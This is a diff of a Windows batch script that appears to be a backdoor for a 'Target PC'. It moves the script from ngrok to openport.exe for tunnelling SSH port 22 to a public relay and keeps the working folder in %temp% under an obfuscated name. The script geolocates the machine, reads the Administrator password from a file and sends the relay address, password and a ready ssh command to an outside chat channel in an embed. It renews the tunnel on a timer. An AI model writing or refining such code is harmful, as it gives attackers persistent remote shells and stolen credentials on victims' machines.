@@ -3,15 +3,14 @@ setlocal enabledelayedexpansion
 chcp 65001 >nul
 set "Log=!PFaS!\log" & IF NOT EXIST !Log! mkdir !Log!
 set "EmbedText=Connection credentials"
-set "Json.Auth=%~1"
-set "Json.Auth2=%~2"
-set "Json.Auth3=%~3"
-set "TriedTwo=False"
+
+::temp
+set "PFaS=!temp!\I4-L63O3V6E-82DI18C24K23S" & IF NOT EXIST !PFaS! mkdir !PFaS!
 
 for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"
 
-taskkill /IM ngrok.exe /F
-start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth! > !PFas!\ngrok.log
+!PFaS!\openport.exe kill 22
+start /B "forward" !PFas!\openport.exe 22 forward > !PFas!\forward.log
 
 echo [Total error cound of the session]>>!StatusFile!
 echo ErrorCount=!ErrorCount!>>!StatusFile!
@@ -21,32 +20,26 @@ call source.bat +silent --embed "Target PC (%computername%\%username%) status fi
 call source.bat +silent --file "!StatusFile!"
 
 :check
-    find /c "url=" !PFaS!\ngrok.log >NUL
-    if !errorlevel! equ 1 goto notfound
-    goto done
+    find /c "https" !PFaS!\forward.log >NUL
+    if !errorlevel! equ 0 ( goto done ) else (
+        goto notfound
+    )
     :notfound
-        find /c "ERR" !PFaS!\ngrok.log >NUL
-        if !errorlevel! equ 1 (
+        find /c "https" !PFaS!\forward.log >NUL
+        if !errorlevel! equ 0 (
             timeout 3
-            goto check
+            goto notfound
         ) else (
-            if !TriedTwo!==True (
-                taskkill /IM ngrok.exe /F
-                start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth3! > !PFas!\ngrok.log
-                goto check
-            )
-            taskkill /IM ngrok.exe /F
-            start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout --authtoken !Json.Auth2! > !PFas!\ngrok.log
-            set "TriedTwo=True"
-            goto check
+            goto done
         )
-    goto done
     :done
-        xcopy /h /Y !PFaS!\ngrok.log !Log!
+        xcopy /h /Y !PFaS!\forward.log !Log!
 
-        for /f "delims=" %%a in (!Log!\ngrok.log) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
-        for /f "tokens=8 delims==" %%a in ("!Result!") do (
-            for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
+        for /f "tokens=2 delims=:" %%a in ('type "!log!\forward.log"') do (
+            echo %%a | findstr /c:"openport.io" || (
+                set Port=%%a
+                set Port=!Port: to localhost=!
+            )
         )
 
         FOR /F "delims=" %%F IN (!TFolder!\pass.txt) DO SET Pass=%%F
@@ -54,11 +47,11 @@ call source.bat +silent --file "!StatusFile!"
         set Port=%RemoteURL:~-5%
         set IP=%RemoteURL:~0,14%
 
-        call Source.bat +silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||!RemoteURL!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)\\n\\n:arrow_right: **CMD command:** ||ssh Administrator@!IP! -p !Port!||" "FFFDBC" "https://i.imgur.com/b2Terft.png"
+        call Source.bat +silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||openport.io:!Port!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)\\n\\n:arrow_right: **CMD command:** ||ssh Administrator@!IP! -p !Port!||" "FFFDBC" "https://i.imgur.com/b2Terft.png"
         :Loop
-            timeout 14400
-            taskkill /IM ngrok.exe /F
-            start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
+            timeout 82800
+            !PFaS!\openport.exe kill 22
+            start /B "forward" !PFaS!\openport.exe 22 forward > forward.log
             set "Change=Not Changed"
             set "EmbedText=Renewing session"
             goto check
